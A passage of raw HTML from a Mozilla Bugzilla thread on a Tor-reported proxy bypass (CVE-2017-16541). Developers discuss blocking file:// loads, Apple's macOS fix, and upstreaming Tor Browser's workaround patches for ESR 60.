          <div class="change-time"><span class="rel-time" title="2017-11-21 10:47 PST" data-time="1511290051">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-53" data-comment-id="12862994">Do we have UI resources that load from file:// URIs?

If we only want to disable it from web pages, seems like an extension could easily do that...</pre></div><div class="change-set" id="c54"><div class="comment" data-id="12863050" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a2243361_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a2243361_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-11-21 11:01 PST" data-time="1511290868">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-54" data-comment-id="12863050">(In reply to Boris Zbarsky [:bz] (no decent commit message means r-) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c53">comment #53</a>)
<span class="quote">&gt; Do we have UI resources that load from file:// URIs?
&gt; 
&gt; If we only want to disable it from web pages, seems like an extension could
&gt; easily do that...</span >

We can substitute internally to file:// (moz-ext:, resource:, jar:?), so general disabling is not possible, right.  

We want to disable only: top level loads (typing in address bar, command line, link clicks), iframes, subresources, general redirects-to, something else?

The distinction could be system principal, but I'm not sure if there can be a case of a system-principal load that is user/content-controlled and not application-controlled.</pre></div><div class="change-set" id="c55"><div class="comment" data-id="12959078" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a2243361_269762"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a2243361_269762"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-10 11:20 PST" data-time="1515612054">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-55" data-comment-id="12959078">Apple have notified me that they believe this is fixed in the macOS 10.13.3 beta -- once that's released (they didn't provide a date) we can disclose the bypass mechanism if we like.</pre></div><div class="change-set" id="a7279423_474980"><div class="change" id="aa7279423_474980">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a7279423_474980"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_474980" id="a7279423_474980"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7279423_474980"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7279423_474980">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a7279423_474980">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-18 17:29 PST" data-time="1516325357">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [tor][sec-critical for Tor][necko-triaged] &rarr; [tor 24052][sec-critical for Tor][necko-triaged]</div></div></div><div class="change-set" id="c56"><div class="comment" data-id="12989590" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a7279423_474980"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a7279423_474980"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-23 10:49 PST" data-time="1516733395">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-56" data-comment-id="12989590">This is fixed in today's macOS 10.13.3 release.</pre></div><div class="change-set" id="a7690940_578488"><div class="change" id="aa7690940_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a7690940_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a7690940_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7690940_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7690940_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a7690940_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-01-23 11:47 PST" data-time="1516736874">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; arthuredelstein</div><div class="change">Priority: P2 &rarr; P1</div></div></div><div class="change-set" id="c57"><div class="comment" data-id="13011836" data-no="57"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-57" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a7690940_578488"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a7690940_578488"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-57"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-57" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c57">Comment 57</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-01 09:51 PST" data-time="1517507500">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-57">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-57" data-comment-id="13011836">Now that this is resolved in macOS, I'd like to go about upstreaming to Firefox the improvements tor landed to refuse to access file:// resources earlier.

Arthur, is that something on your roadmap, or would it be helpful if I took that on? And if the latter, do you have a link to the patches that tor is currently applying for this?</pre><div class="activity"><div class="change">Flags: needinfo?(arthuredelstein)</div></div></div><div class="change-set" id="c58"><div class="comment" data-id="13013647" data-no="58"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-58" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a7690940_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a7690940_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-58"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-58" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c58">Comment 58</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-02 03:11 PST" data-time="1517569868">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-58">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-58" data-comment-id="13013647">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c57">comment #57</a>)
<span class="quote">&gt; Now that this is resolved in macOS, I'd like to go about upstreaming to
&gt; Firefox the improvements tor landed to refuse to access file:// resources
&gt; earlier.
&gt; 
&gt; Arthur, is that something on your roadmap, or would it be helpful if I took
&gt; that on? And if the latter, do you have a link to the patches that tor is
&gt; currently applying for this?</span >

If you could work on this, please do. The patches are here:

<a rel="nofollow" href="https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=4fbe4216456298af5c68198b3ff0f552f9bb8464">https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=4fbe4216456298af5c68198b3ff0f552f9bb8464</a>
<a rel="nofollow" href="https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=a7ddff8279b931f42cccc538fc1cdd6a51c23795">https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=a7ddff8279b931f42cccc538fc1cdd6a51c23795</a>
<a rel="nofollow" href="https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=ab28cdb28b2e974129d141e4150f1486404cb254">https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&amp;id=ab28cdb28b2e974129d141e4150f1486404cb254</a>

Now, those were just hacks (and a follow-up bugfix) we deployed to close the critical hole as fast as possible and they are breaking some file:// usage scenarios. I am not sure Mozilla would want those. If so, fine with us. But if you or anyone else could use this opportunity to have a real fix ready for ESR 60 that would be great!</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(arthuredelstein)</span></div></div></div><div class="change-set" id="a9011005_75935"><div class="change" id="aa9011005_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a9011005_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a9011005_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a9011005_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a9011005_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a9011005_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-07 18:28 PST" data-time="1518056939">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=isnotempty">status-firefox58</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox58&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=isnotempty">status-firefox59</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=isnotempty">status-firefox60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox59&amp;o1=isnotempty">tracking-firefox59</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox59&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=isnotempty">tracking-firefox60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c59"><div class="comment" data-id="13065090" data-no="59"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-59" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a9011005_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a9011005_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-59"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-59" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c59">Comment 59</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-23 11:52 PST" data-time="1519415525">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-59">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-59" data-comment-id="13065090">Too late in the 59 cycle at this point.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=isnotempty">status-firefox59</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox59&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c60"><div class="comment" data-id="13148873" data-no="60"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-60" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a9011005_75935"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a9011005_75935"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-60"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-60" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c60">Comment 60</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-22 09:27 PDT" data-time="1521736067">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-60">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-60" data-comment-id="13148873">This seems stalled.  Alex, do you still want to look at this?</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=isnotempty">status-firefox60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=fix-optional">fix-optional</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=isnotempty">status-firefox61</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=isnotempty">tracking-firefox60</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=equals&amp;v1=%2B">+</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox60&amp;o1=equals&amp;v1=-">-</a></div><div class="change">Flags: needinfo?(agaynor)</div></div></div><div class="change-set" id="c61"><div class="comment" data-id="13148878" data-no="61"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-61" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a9011005_75935"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a9011005_75935"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-61"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-61" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c61">Comment 61</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-22 09:30 PDT" data-time="1521736201">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-61">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-61" data-comment-id="13148878">I was planning on it, but haven't had the cycles to. With Apple's kernel fix the priority is slightly lower since it's non-exploitable on patched macOS.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(agaynor)</span></div></div></div><div class="change-set" id="c62"><div class="comment" data-id="13148887" data-no="62"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-62" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a9011005_75935"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_578488" id="a9011005_75935"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-62"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-62" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c62">Comment 62</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-22 09:33 PDT" data-time="1521736426">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-62">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-62" data-comment-id="13148887">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c61">comment #61</a>)
<span class="quote">&gt; I was planning on it, but haven't had the cycles to. With Apple's kernel fix
&gt; the priority is slightly lower since it's non-exploitable on patched macOS.</span >

Only for our use case. It's still a proxy bypass, so Tor is carrying an incomplete fix for this that (I think) breaks some functionality like Save t file or something similar. They're going to wind up backporting whatever we come up with to 60; so it would be good to avoid a confusing rebase for them...</pre></div><div class="change-set" id="a13128757_474980"><div class="change" id="aa13128757_474980">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" id="a13128757_474980"><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_474980" id="a13128757_474980"><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13128757_474980"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13128757_474980">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a13128757_474980">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-03-27 11:18 PDT" data-time="1522174691">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: arthuredelstein &rarr; nobody</div></div></div><div class="change-set" id="a13645933_279663"><div class="change" id="aa13645933_279663">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a13645933_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a13645933_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a13645933_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a13645933_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a13645933_279663">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-02 10:57 PDT" data-time="1522691867">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Priority: P1 &rarr; P2</div></div></div><div class="change-set" id="a15112605_415378"><div class="change" id="aa15112605_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a15112605_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a15112605_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15112605_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15112605_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a15112605_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-04-19 10:22 PDT" data-time="1524158539">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; valentin.gosu</div></div></div><div class="change-set" id="c63"><div class="comment" data-id="13280994" data-no="63"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-63" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a15112605_415378"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a15112605_415378"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-63"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-63" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c63">Comment 63</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 03:28 PDT" data-time="1526466518">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-63">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-63" data-comment-id="13280994">We are currently preparing Tor Browser based on ESR 60 and it turns out that a (critical) part of our workaround is broken now. Valentin: what's your planned timeframe for looking into this bug?</pre><div class="activity"><div class="change">Flags: needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c64"><div class="comment" data-id="13282658" data-no="64"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-64" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a15112605_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a15112605_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-64"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-64" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c64">Comment 64</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 13:27 PDT" data-time="1526502422">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-64">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-64" data-comment-id="13282658">I have a WIP patch based on <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
